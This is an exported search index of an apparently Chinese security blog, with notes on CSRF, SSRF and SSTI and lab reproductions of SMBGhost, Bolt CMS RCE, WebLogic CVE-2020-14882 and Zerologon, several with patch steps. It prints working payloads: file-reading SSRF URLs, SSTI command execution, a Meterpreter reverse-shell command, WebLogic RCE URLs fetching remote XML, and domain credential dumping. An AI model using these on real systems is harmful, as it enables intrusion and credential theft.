<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSRF&amp;SSTI&amp;SSRF笔记</title>
    <url>/2020/07/05/CSRF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>学习CSRF..SSRF..SSTI和逻辑漏洞</p>
<a id="more"></a>


<h2 id="CSRF-Cross-site-request-forgery-跨站请求伪造"><a href="#CSRF-Cross-site-request-forgery-跨站请求伪造" class="headerlink" title="CSRF(Cross-site request forgery)跨站请求伪造"></a>CSRF(Cross-site request forgery)跨站请求伪造</h2><p>跨站点请求伪造被称为CSRF，发生在用户访问站点上的页面时，该页面在另一个站点上执行操作。 假设用户点击了由恶意攻击者精心构造的恶意链接，该html连接的内容为：<code>&lt;img src =&quot; https://vulnerable-website.com/email/change?email=pwned @ evil-user.net&quot;&gt;</code>，用户点击之后，会将易受攻击的网站上的帐户电子邮件更改为”<a href="mailto:pwned@evil-user.net">pwned@evil-user.net</a>“。CSRF之所以起作用是因为发出请求的是受害者而不是站点，因此，被攻击站点看到的只是发出普通请求的普通用户。例如，通过使用密码重置，完全控制了用户的帐户。在极端情况下甚至能获取受害者信用卡的信息。</p>
<p>利用要求：</p>
<ul>
<li>攻击者必须构造恶意链接诱使受害者点击链接</li>
<li>服务器存在CSRF漏洞</li>
<li>服务器没有二次验证机制</li>
<li>用户的身份验证没有过期</li>
<li>攻击者要熟悉网站请求</li>
</ul>
<p>CSRF 发生原因： <strong>服务器对用户的验证不够严格(二次验证)</strong></p>
<blockquote>
<p>攻擊者並不能通過CSRF攻擊來直接獲取用戶的帳戶控制權，也不能直接竊取用戶的任何信息。他們能做到的，是欺騙用戶的瀏覽器，讓其以用戶的名義執行操作。</p>
</blockquote>
<p>CSRF 能做到的：</p>
<ul>
<li>修改个人信息/帐号密码</li>
<li>发送伪造的业务请求</li>
<li>关注他人的社交帐号,推送博文</li>
<li>在用户非自愿,不知情的情况下提交请求</li>
<li>获取信用卡等信息</li>
</ul>
<p>攻击方法:</p>
<p>如果服务器没有做任何验证,则可以直接构造恶意链接诱使用户点击</p>
<p>如果服务器对Referer进行了验证,则可以考虑</p>
<ul>
<li>修改文件名(如dvwa medium难度)</li>
<li>如果站点下存在xss漏洞则可以结合,构造反射型恶意链接,或将恶意js代码存储在数据库中(存储型)</li>
</ul>
<h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><ol>
<li>重要操作加入验证码</li>
<li>Referer 检测</li>
<li>Anti CSRF Token<br> 生成一个Token，放在用户的Session中，或者在浏览器的Cookie中。<br> 页面表单附带Token参数<br> 用户提交请求后，服务端验证表单中的Token是否与用户的Token一致<br> 这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露。</li>
</ol>
<h2 id="SSRF-服务端请求伪造攻击"><a href="#SSRF-服务端请求伪造攻击" class="headerlink" title="SSRF 服务端请求伪造攻击"></a>SSRF 服务端请求伪造攻击</h2><p>SSRF是Web应用程序中的漏洞，攻击者可以通过该漏洞通过服务器发出进一步的HTTP请求。攻击者可以利用此漏洞与服务器网络上通常受防火墙保护的内部服务进行通信。</p>
<p><img src="https://images.atsud0.me/images/post/cAozwRZ.png" alt=""></p>
<p>在正常情况下，攻击者只能访问网站并看到网站数据。运行网站的服务器被允许与内部的GitLab或Postgres数据库进行通信，但用户可能不允许，因为中间的防火墙只允许访问80端口（HTTP）和443端口（HTTPS）.然而，SSRF将使攻击者有能力通过连接到网站服务器，然后使用该服务器连接到数据库，从而与Postgres建立连接并查看其数据。Postgres会认为网站正在向数据库请求什么，但实际上，这是攻击者利用网站的SSRF漏洞来获取数据。过程通常会是这样的：攻击者在网站上发现一个SSRF漏洞。防火墙允许其对网站的请求。然后，攻击者利用SSRF漏洞，迫使网站服务器从数据库中请求数据，然后将数据返回给攻击者。由于请求来自网络服务器，而不是直接来自攻击者，所以防火墙允许这个请求通过。</p>
<ul>
<li><a href="https://gist.github.com/mzfr/fd9959bea8e7965d851871d09374bb72" target="_blank" rel="noopener">生成十六进制的IP地址</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#file" target="_blank" rel="noopener">各种绕过姿势</a></li>
</ul>
<p>SSRF产生原因:</p>
<p>web服务器过于信任用户输入的URL地址。</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;vulurl&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:3306</span><br><span class="line"></span><br><span class="line"># 也可以变成这样</span><br><span class="line">http:&#x2F;&#x2F;vulurl&#x2F;?url&#x3D;http:&#x2F;&#x2F;localhost:3306</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;:::3306</span><br><span class="line">127.0.0.1 可以变化成</span><br><span class="line">127.127.127.127</span><br><span class="line">127.4.5.6 等等</span><br><span class="line"></span><br><span class="line"># 读文件</span><br><span class="line">http:&#x2F;&#x2F;vulurl&#x2F;?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># 也可以用十进制绕过</span><br><span class="line">http:&#x2F;&#x2F;2130706433&#x2F; &#x3D; http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line"></span><br><span class="line"># 十六进制也是可以的</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;0x7f000001&#x2F; &#x3D; http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure>


<h3 id="防御方式-1"><a href="#防御方式-1" class="headerlink" title="防御方式"></a>防御方式</h3><ul>
<li>限制协议为HTTP、HTTPS</li>
<li>不用限制302重定向</li>
<li>设置URL白名单或者限制内网IP</li>
</ul>
<h2 id="SSRF，XSS，CSRF-三者区别"><a href="#SSRF，XSS，CSRF-三者区别" class="headerlink" title="SSRF，XSS，CSRF 三者区别"></a>SSRF，XSS，CSRF 三者区别</h2><p>不同点:</p>
<ul>
<li>XSS:利用用户对站点的信任</li>
<li>CSRF:利用站点对已经验证用户的信任</li>
<li>SSRF:利用内网服务器对内网边界机器的信任</li>
</ul>
<p>相同点：</p>
<blockquote>
<p>都是过于信任用户的输入，没有严格过滤用户的输入。</p>
</blockquote>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI服务器模板注入<code>Server Side Template Injection</code></p>
<blockquote><p>而服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<footer><strong>RickGray</strong><cite><a href="https://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/" target="_blank" rel="noopener">服务端模板注入攻击 (SSTI) 之浅析</a></cite></footer></blockquote>

<p>简单的探测语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;2*2&#125;&#125;如果出来的是计算之后的结果，则表明可能存在注入。</span><br><span class="line">personal_greeting&#x3D;username 如果出来是用户名</span><br><span class="line">&#123;&#123;config&#125;&#125;如果出来的是配置文件，则表明可能存在注入。</span><br></pre></td></tr></table></figure>


<p>漏洞发生原因：<br>模板渲染的值受到用户控制，并且没有严格过滤用户的输入。</p>
<p>漏洞危害能从XSS甚至到RCE。</p>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection" title="" target="">SSTI的有效载荷</a>

<p>自动检测工具<code>tplmap</code><a href="https://github.com/epinna/tplmap" title="" target="">tplmap</a></p>
<p>GET型 <code>tplmap -u &lt;url&gt;/?&lt;vulnparam&gt;</code><br>POST型 <code>tplmap -u &lt;url&gt; -d &#39;&lt;vulnparam&gt;&#39;</code></p>
<p>Payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40]()(&quot;&lt;file&gt;&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>Payload2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&quot;&lt;commond&gt;&quot;).read()&#125;&#125;&#96;</span><br></pre></td></tr></table></figure>


<h2 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h2><ul>
<li>关键操作缺少确认机制</li>
<li>自动扫描程序无法发现此类漏洞</li>
</ul>
<h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><p>分为水平越权，和垂直越权。<br>越权漏洞形成的原因是后台使用了不合理的权限校验规则导致的。</p>
<p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p>
<h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>A和B属于同等级的用户，只能操作自己的信息。但是如果A能操作B的信息，那就是水平越权。</p>
<h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>A的级别比B高，B无权执行A的操作，但是B能够操作A的权限的话，就是垂直越权。</p>
<p>越权漏洞可能发生的地方<strong>所有用户信息查询,修改,等页面.</strong></p>
<p><img src="https://github.com/SecWiki/sec-chart/blob/master/Web%E5%AE%89%E5%85%A8/%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93.png" alt=""></p>
<p>如何挖?</p>
<blockquote>
<p>确定业务流程—&gt;寻找流程中可以被操控的环节—&gt;分析可被操控环节中可能产生的逻辑问题—&gt;尝试修改参数触发逻辑问题</p>
</blockquote>
<h4 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h4><ul>
<li>改用session</li>
<li>登录时再加验证</li>
<li>修改等操作加个判断当前用户是否有权限修改。</li>
</ul>
<h4 id="交易支付中的逻辑问题"><a href="#交易支付中的逻辑问题" class="headerlink" title="交易支付中的逻辑问题"></a>交易支付中的逻辑问题</h4><ol>
<li>加入购物车时是否可以修改购买数量为负数?</li>
<li>商品价格是否可以修改?</li>
<li>确认购物车信息时是否可以修改商品数量为负数?</li>
<li>是否存在折扣限制突破问题?</li>
<li>是否可以修改商品总金额?</li>
<li>输入物流信息时是否可以控制运费?如果可以,尝试修改为负数.</li>
<li>确认订单后跳转支付接口时是否可以修改支付金额?</li>
<li>可否不支付直接跳转到交易成功环节?</li>
</ol>
<h4 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h4><p><img src="https://upload-images.jianshu.io/upload_images/11964168-ce249c3662f60998.png" alt=""></p>
<blockquote>
<p>首先走一遍正常的密码修改流程,把过程中所有环节的数据包全部保存.<br>分析流程中哪些步骤使用了哪些身份认证信息,使用了哪些认证方法.<br>分析哪个步骤是可以跳过,或者可以直接访问某个步骤.<br>分析每个认证方法是否存在缺陷,可否越权<br>首先尝试正常密码找回流程,选择不同找回方式,如邮箱,手机,密码提示问题等.<br>分析各种找回机制所采用的验证手段,如验证码的有效期,有效次数,生成规律,是否与用户信息相关联等.<br>抓取修改密码步骤的所有数据包,尝试修改关键信息,如用户名,用户ID,邮箱地址,手机号码等。</p>
</blockquote>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>CSRF</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-0796漏洞复现</title>
    <url>/2020/07/02/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0796" target="_blank" rel="noopener">CVE-2020-0796</a>是SMBv3.1.1压缩机制中的一个bug，也称为”SMBGhost”。这个错误是整数溢出错误，它发生在srv2.sys SMB服务器驱动程序的Srv2DecompressData函数中。Srv2DecompressData函数接收客户机发送的压缩消息，分配所需的内存，并解压数据。然后，如果偏移量字段不为零，它将放在压缩数据之前的数据复制到已分配缓冲区的开始位置。如果攻击者精心构造了一段消息发送给SMB，有可能将会导致溢出执行任意命令。</p>
<p>影响版本</p>
<ul>
<li>Windows 10 v1903</li>
<li>Windows 10 v1909</li>
<li>Windows Server v1903</li>
<li>Windows Server v1909</li>
</ul>
<a id="more"></a>

<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>攻击机:Kali<br>目标机:Windows 10 v1903<br>下载<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC" target="_blank" rel="noopener">exp</a></p>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤:"></a>步骤:</h3><p>1.下载exp<br>2.生成shellcode<br>    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.40.228 lport&#x3D;3333 -f py -o shellcode.txt</span><br></pre></td></tr></table></figure><br>3. 将生成的shellcode替换exp里面的USER_PAYLOAD<br>4. msf开启监听<br>5. 执行exp</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200702_225241.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200702_225148.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200702_225213.jpg" alt=""></p>
<h2 id="漏洞修复方式"><a href="#漏洞修复方式" class="headerlink" title="漏洞修复方式"></a>漏洞修复方式</h2><h3 id="1-更新系统补丁"><a href="#1-更新系统补丁" class="headerlink" title="1.更新系统补丁"></a>1.更新系统补丁</h3><h3 id="2-禁用445端口"><a href="#2-禁用445端口" class="headerlink" title="2.禁用445端口"></a>2.禁用445端口</h3><h3 id="3-禁用SMBv3压缩"><a href="#3-禁用SMBv3压缩" class="headerlink" title="3.禁用SMBv3压缩"></a>3.禁用SMBv3压缩</h3><p>要禁用SMBv3功能要在powershell中执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot; DisableCompression -Type DWORD -Value 1 -Force</span><br></pre></td></tr></table></figure>

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/" target="_blank" rel="noopener">Exploiting SMBGhost (CVE-2020-0796) for a Local Privilege Escalation: Writeup + POC</a></li>
<li><a href="https://www.freebuf.com/articles/others-articles/241937.html" target="_blank" rel="noopener">从CVE-2020-0796到Meterpreter后渗透攻击 </a></li>
<li><a href="https://packetstormsecurity.com/files/156731/CoronaBlue-SMBGhost-Microsoft-Windows-10-SMB-3.1.1-Proof-Of-Concept.html" target="_blank" rel="noopener">CoronaBlue / SMBGhost Microsoft Windows 10 SMB 3.1.1 Proof Of Concept</a></li>
<li><a href="https://blog.rapid7.com/2020/03/12/cve-2020-0796-microsoft-smbv3-remote-code-execution-vulnerability-analysis/" target="_blank" rel="noopener">CVE-2020-0796: Microsoft SMBv3 Remote Code Execution Vulnerability Analysis</a></li>
</ul>
]]></content>
      <categories>
        <category>靶机实验</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>CVE-2020-0796</tag>
      </tags>
  </entry>
  <entry>
    <title>Bolt CMS 3.7.0 身份认证远程代码执行</title>
    <url>/2020/05/30/Bolt-CMS-3-7-0-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>一个<code>bolt cms 3.70</code>漏洞利用?</p>
<a id="more"></a>


<a href="https://www.exploit-db.com/exploits/48296" title="" target="">Bolt CMS 3.7.0 - Authenticated Remote Code Execution</a>

<p>漏洞作者:<a href="https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py" title="" target="">r3m0t3nu11</a></p>
<p>靶机链接:<a href="https://tryhackme.com/room/eritsecurusi" title="" target="">Erit Securus I</a></p>
<p>利用要求</p>
<ul>
<li>知道网站用户名和密码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python exp.py http:&#x2F;&#x2F;10.10.10.10 admin passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200530_170115.jpg" alt=""></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Bolt</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-14882&amp;CVE-2020-14883漏洞复现</title>
    <url>/2020/10/30/CVE-2020-14882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码。它们均存在于WebLogic的Console控制台组件中。此组件为WebLogic全版本默认自带组件，且该漏洞通过HTTP协议进行利用。将CVE-2020-14882和CVE-2020-14883进行组合利用后，远程且未经授权的攻击者可以直接在服务端执行任意代码，获取系统权限。</p>
<a id="more"></a>



<h2 id="登陆绕过POC"><a href="#登陆绕过POC" class="headerlink" title="登陆绕过POC"></a>登陆绕过POC</h2><p>访问以下URL，即可未授权访问到管理后台页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>

<h2 id="命令执行POC"><a href="#命令执行POC" class="headerlink" title="命令执行POC"></a>命令执行POC</h2><p>POC Weblogic 10</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span> <span class="attr">init-method</span>=<span class="string">"start"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[touch /tmp/success2]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http:&#x2F;&#x2F;192.168.56.1:8000&#x2F;evil.xml&quot;)</span><br></pre></td></tr></table></figure>

<p>POC Weblogc 12</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22);</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20&#x2F;tmp&#x2F;success1&#39;);&quot;)</span><br></pre></td></tr></table></figure>

<p>Weblogic 10 没有com.tangosol.coherence.mvel2.sh.ShellSession这个gadget，只存在于weblogic 12，weblogic10 并没有这个包，所以无法使用。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/_zNr5Jw7tH_6XlUdudhMhA" target="_blank" rel="noopener"> cve-2020-14882 weblogic 越权绕过登录分析 </a></li>
<li><a href="https://mp.weixin.qq.com/s/48VIwTkyFVXUTS78kNByhg" target="_blank" rel="noopener"> CVE-2020-14882 weblogic 未授权命令执行复现 </a></li>
</ul>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在oracle官网下载好补丁后。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export WL_HOME&#x3D;&quot;&#x2F;root&#x2F;Oracle&#x2F;Middleware&#x2F;wlserver_10.3&quot;</span><br><span class="line">export MW_HOME&#x3D;&quot;&#x2F;root&#x2F;Oracle&#x2F;Middleware&quot;</span><br><span class="line">#修改成自己的实际路径</span><br></pre></td></tr></table></figure>

<p>将<code>p31641257_1036_Generic.zip</code>和<code>p32097188_10360201020_Generic.zip</code>解压到<code>${MW_HOME}/utils/bsu/cache_dir</code></p>
<p>然后修改<code>${MW_HOME}/utils/bsu/bsu.sh</code>里面的内存如果小了，安装补丁的时候可能会报错。尽量大一点（根据实际内存分配），最好符合补丁的要求（README.txt）的那个文件有。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- Configuring Memory options</span><br><span class="line"> </span><br><span class="line">   For Microsoft Windows systems</span><br><span class="line">   Edit the bsu.cmd script and change memory options as follows:</span><br><span class="line">   set MEM_ARGS&#x3D;-Xms1024m -Xmx4096m</span><br><span class="line"> </span><br><span class="line">   For UNIX Systems</span><br><span class="line">   Edit the bsu.sh script and change memory options as follows:</span><br><span class="line">   MEM_ARGS&#x3D;&quot;-Xms1024m -Xmx4096m&quot;</span><br></pre></td></tr></table></figure>

<p>然后安装补丁</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;bsu.sh -install -patch_download_dir&#x3D;$&#123;MW_HOME&#125;&#x2F;utils&#x2F;bsu&#x2F;cache_dir -patchlist&#x3D;NA7A -prod_dir&#x3D;$&#123;WL_HOME&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;bsu.sh -install -patch_download_dir&#x3D;$&#123;MW_HOME&#125;&#x2F;utils&#x2F;bsu&#x2F;cache_dir -patchlist&#x3D;KYRS -prod_dir&#x3D;$&#123;WL_HOME&#125;</span><br></pre></td></tr></table></figure>

<p>安装一个要等十多分钟左右。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201110092953977.png" alt="image-20201110092953977"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201110093001464.png" alt="image-20201110093001464"></p>
<p>要么成功，要么补丁冲突。。</p>
<p>之后再执行poc</p>
<p><img src="https://images.atsud0.me/images/post/image-20201110093537349.png" alt="image-20201110093537349"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
      </categories>
      <tags>
        <tag>Weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-1472漏洞复现</title>
    <url>/2020/10/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote>
<p>2020年08月12日， 360CERT监测发现Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分。</p>
<p>攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序。</p>
</blockquote>
<a id="more"></a>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server 2016 (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br></pre></td></tr></table></figure>



<h2 id="漏洞功能"><a href="#漏洞功能" class="headerlink" title="漏洞功能"></a>漏洞功能</h2><p>通过利用该漏洞，将域控机器用户的密码置空。利用secretsdump无密码来获取凭证。</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>前置工具下载</p>
<ul>
<li><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">impacket</a></li>
</ul>
<p>exp下载</p>
<ul>
<li><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">dirkjanm</a></li>
<li><a href="https://github.com/k8gege/CVE-2020-1472-EXP/blob/master/cve-2020-1472.ini" target="_blank" rel="noopener">K8gege</a></li>
</ul>
<p>hash恢复下载</p>
<ul>
<li><a href="https://github.com/risksense/zerologon" target="_blank" rel="noopener">zerologon-hash-restore</a></li>
</ul>
<p><img src="https://images.atsud0.me/images/post/image-20201024195355578.png" alt="image-20201024195355578"></p>
<p>测试环境</p>
<ul>
<li>域名：abc.com</li>
<li>主机名：DC</li>
<li>IP: 192.168.179.2</li>
<li>测试环境：Windows Server 2012 R2</li>
</ul>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>确保已经安装好了<code>impacket</code>，运行<code>cve-2020-1472-exploit.py</code>置空域控机器用户的hash。</p>
<p>域控机器用户指的是SYSTEM。而不是域控管理员，Administartor。</p>
<p>如果一切正常的话将会输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 cve-2020-1472-exploit.py DC 192.168.179.2</span><br><span class="line"></span><br><span class="line">Performing authentication attempts...</span><br><span class="line">=================================================================================================================================================================================================================================================================================================================================================================================</span><br><span class="line">Target vulnerable, changing account password to empty string</span><br><span class="line"></span><br><span class="line">Result: 0</span><br><span class="line"></span><br><span class="line">Exploit complete!</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201024201155607.png" alt="image-20201024201155607"></p>
<p>此时域控的机器用户密码已经为空，这意味着我们能利用<code>secretdump.py</code>无密码的获取域控的凭证。</p>
<p>运行以下命令获取凭证。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py abc.com&#x2F;DC\$@192.168.179.2 -no-pass</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201024201718178.png" alt="image-20201024201718178"></p>
